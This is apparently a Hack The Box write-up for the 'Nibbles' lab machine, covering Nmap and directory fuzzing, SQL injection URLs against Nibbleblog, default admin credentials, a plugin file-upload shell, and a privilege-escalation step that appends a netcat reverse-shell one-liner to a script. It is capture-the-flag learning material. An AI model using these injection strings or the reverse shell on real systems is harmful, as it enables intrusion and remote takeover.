---
title: "Nibbles"
date: 2024-07-20
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "nibbles", "htb writeup", "htb walkthrough", "hackthebox", "writeup"]
---

OS: Linux 
Difficulty: Easy

## Enumeration

### Nmap

```sh
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### HTTP

![screenshot](/assets/images/nibbles1.png)

![screenshot](/assets/images/nibbles2.png)

#### `/nibbleblog/`

![screenshot](/assets/images/nibbles3.png)

![screenshot](/assets/images/nibbles4.png)

####  `/nibbleblog/admin/`

![screenshot](/assets/images/nibbles5.png)

http://10.10.10.75/nibbleblog/plugins/about/plugin.bit

![screenshot](/assets/images/nibbles6.png)

>nibbleblog 3.7

#### Fuzzing

```sh
# subdomain
ffuf -u http://10.10.10.75 -H "Host: FUZZ.usage.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

# dir
feroxbuster -u http://10.10.10.75/nibbleblog -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' -o nibbleblog_ferox
```

http://10.10.10.75/nibbleblog/content/private/users.xml

![screenshot](/assets/images/nibbles8.png)

## Foothold

### SQLi

https://www.exploit-db.com/exploits/35865

![screenshot](/assets/images/nibbles7.png)

```sh
# original 1
http://10.10.10.75/nibbleblog/index.php?page=admin' OR 1=1 -- //

# URL encoded
http://10.10.10.75/nibbleblog/index.php?page=admin'%20OR%201=1%20--%20//

# URL encoded 2 
http://10.10.10.75/nibbleblog/index.php?page=admin'%20OR%201=1;--%20-

# original 2
http://10.10.10.75/nibbleblog/index.php?idpost=admin%20OR%201=1%20--%20/

```
### Admin portal

![screenshot](/assets/images/nibbles10.png)

![screenshot](/assets/images/nibbles9.png)

>`admin : nibbles`

![screenshot](/assets/images/nibbles11.png)

nibbleblog version 4.0.3

### https://github.com/hadrian3689/nibbleblog_4.0.3

![screenshot](/assets/images/nibbles12.png)

https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html

![screenshot](/assets/images/nibbles13.png)

Upload the shell to Plugins : My Image

![screenshot](/assets/images/nibbles14.png)

Navigate to http://10.10.10.75/nibbleblog/content/private/plugins/my_image/

![screenshot](/assets/images/nibbles15.png)

Click Image.php

![screenshot](/assets/images/nibbles16.png)

## Privilege Escalation

### Enumeration

![screenshot](/assets/images/nibbles17.png)

### Attempts

```sh
# Inserting a reverse shell one-liner in a script
echo >> monitor.sh

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4444 >/tmp/f" >> monitor.sh
```

![screenshot](/assets/images/nibbles18.png)

![screenshot](/assets/images/nibbles19.png)
